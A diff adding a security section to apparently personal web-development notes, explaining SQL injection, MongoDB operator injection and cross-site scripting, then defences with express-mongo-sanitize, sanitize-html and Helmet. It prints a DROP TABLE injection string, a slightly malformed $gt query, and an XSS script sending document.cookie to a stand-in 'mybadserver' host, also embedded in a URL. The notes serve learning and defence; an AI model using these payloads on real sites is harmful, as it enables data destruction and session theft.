@@ -872,4 +872,163 @@ map.on('mouseleave', 'clusters', () => {
 [Source - mapboxdocs/mapbox-gl-js/example/cluster/](https://docs.mapbox.com/mapbox-gl-js/example/cluster/)
 
 
+# Security
+
+## SQL Injections
+
+SQL injection is a code injection technique used to attack data-driven applications, in which malicious SQL statements are inserted into an entry field for execution (e.g. to dump the database contents to the attacker).[[1]](https://docs.microsoft.com/en-us/previous-versions/sql/sql-server-2008-r2/ms161953(v=sql.105)?redirectedfrom=MSDN) SQL injection must exploit a security vulnerability in an application's software, for example, when user input is either incorrectly filtered for string literal escape characters embedded in SQL statements or user input is not strongly typed and unexpectedly executed. SQL injection is mostly known as an attack vector for websites but can be used to attack any type of SQL database.
+
+SQL takes advantage of the SQL syntax
+`var statement = "SELECT * FROM users WHERE name = '" + userName + "'";`
+
+In a very basic SQL attack, the user, instead of entering their username, enters something like this: 
+`SELECT * FROM users WHERE name = 'a';DROP TABLE users; SELECT * FROM userinfo WHERE 't' = 't';`
+
+What they're doing here is basically closing the first query by adding a single quote to close the query (i.e. `name ='a'`) and then add a semi-colon (`;`) which basically designates the end of a SQL query and allows them to add on their own query. In this example, `DROP TABLE` tells SQL to remove the entire `users` database.
+
+Just because we are using a NoSQL database, doesn't mean we are inmune to this type of attacks. 
+
+[Source - wikipedia/SQL-injection](https://en.wikipedia.org/wiki/SQL_injection)
+
+In this examle we are querying the user for their username: 
+`db.users.find({username: req.body.username});`
+We expect an input that looks like this: 
+`db.users.find({username: 'colt'});`
+However, they could input something like this: 
+`db.users.find({username: "$gt": ""});`
+This tells mongo to find users where 'username' is greater than nothing (all users whose username is greater than an empty string, in other words, find all users.)
+
+## How do we prevent SQL type attacks on Mongo 
+
+Prevent users from using `$`, `.` or any other input that would allow the user to manipulate any dynamic query. 
+
+### express-mongo-sanitize
+
+Express 4.x middleware which sanitizes user-supplied data to prevent MongoDB Operator Injection.
+
+`npm install express-mongo-sanitize`
+
+**Usage**
+Add as a piece of express middleware, before defining your routes.
+
+```Javascript
+const express = require('express');
+const bodyParser = require('body-parser');
+const mongoSanitize = require('express-mongo-sanitize');
+
+const app = express();
+
+app.use(bodyParser.urlencoded({ extended: true }));
+app.use(bodyParser.json());
+
+// To remove data, use:
+app.use(mongoSanitize());
+
+// Or, to replace prohibited characters with _, use:
+app.use(
+  mongoSanitize({
+    replaceWith: '_',
+  }),
+);
+```
+
+[Source - npm/express-mongo-sanitize](https://www.npmjs.com/package/express-mongo-sanitize)
+
+## Cross Site Scripting
+
+Cross-site scripting (XSS) is a type of security vulnerability typically found in web applications. XSS attacks enable attackers to inject client-side scripts into web pages viewed by other users. A cross-site scripting vulnerability may be used by attackers to bypass access controls such as the same-origin policy. Cross-site scripting carried out on websites accounted for roughly 84% of all security vulnerabilities documented by Symantec up until 2007.[1] XSS effects vary in range from petty nuisance to significant security risk, depending on the sensitivity of the data handled by the vulnerable site and the nature of any security mitigation implemented by the site's owner network.
+
+The way it works is the attacker injects their own client-side script that runs on their browser into someone else' application, usually with nefarious intentions.  
+
+[Source - wikipedia/cross-site-scripting](https://en.wikipedia.org/wiki/Cross-site_scripting)
+[Cool game to understand XSS attacks](http://www.xssgame.com/m4KKGHi2rVUN)
+
+A lot of people will have their cookies available in the browser through the document (i.e. `document.cookie`).
+If we can access that cookie, we could insert a script that takes the information from a single user and send it somewhere else (our 'bad server').
+
+`<script>new Image().src="mybadserver/hacker?output="+document.cookie;</script>`
+
+This script creates a new `Image` element, where we set the source `src`. Whenever we set the source on an image the browser will send a request. So this is one way of sending a request that sends `document.cookie` to my server. 
+
+`www.yourwebsite.com?name=<script>new Image().src="mybadserver/hacker?output="+document.cookie;</script>`
+
+This is an example of the same injection in a URL. This will run the injected code whenever that URL is run. 
+
+[Source - XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
+
+### npm sanitize-html
+
+[Source - npm/sanitize-html](https://www.npmjs.com/package/sanitize-html)
+
+## Helmet
+
+`npm install helmet --save`
+
+```Javascript
+const express = require("express");
+const helmet = require("helmet");
+
+const app = express();
+
+app.use(helmet());
+
+// ...
+```
+Helmet is Connect-style middleware, which is compatible with frameworks like Express. (If you need support for Koa, see koa-helmet.)
+
+The top-level helmet function is a wrapper around 15 smaller middlewares, 11 of which are enabled by default.
+
+In other words, these two things are equivalent:
+
+```Javascript
+// This...
+app.use(helmet());
+
+// ...is equivalent to this:
+app.use(helmet.contentSecurityPolicy());
+app.use(helmet.dnsPrefetchControl());
+app.use(helmet.expectCt());
+app.use(helmet.frameguard());
+app.use(helmet.hidePoweredBy());
+app.use(helmet.hsts());
+app.use(helmet.ieNoOpen());
+app.use(helmet.noSniff());
+app.use(helmet.permittedCrossDomainPolicies());
+app.use(helmet.referrerPolicy());
+app.use(helmet.xssFilter());
+```
+
+To set custom options for one of the middleware, add options like this:
+
+```Javascript
+// This sets custom options for the `referrerPolicy` middleware.
+app.use(
+  helmet({
+    referrerPolicy: { policy: "no-referrer" },
+  })
+);
+You can also disable a middleware:
+
+// This disables the `contentSecurityPolicy` middleware but keeps the rest.
+app.use(
+  helmet({
+    contentSecurityPolicy: false,
+  })
+);
+```
+
+There is one issue with Helmet, the `contentSecurityPolicy()` will not be happy with some of the dependencies of our project. Our image won't load, because Helmet will complain about Bootstrap and and Unsplash settings. 
+
+![Headers added by Helmet](/public/images/helmet_headers.png)
+
+You can read more about the different headers that Helmet adds at [here](https://helmetjs.github.io/).
+
+If we compare it to the headers we get when we disable `app.use(helmet())`: 
+
+![Headers without Helmet](/public/images/headers_without_helmet.png)
+
+[Source - Helmet docs](https://helmetjs.github.io/)
+
+Related articles: 
+[What is a Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
 
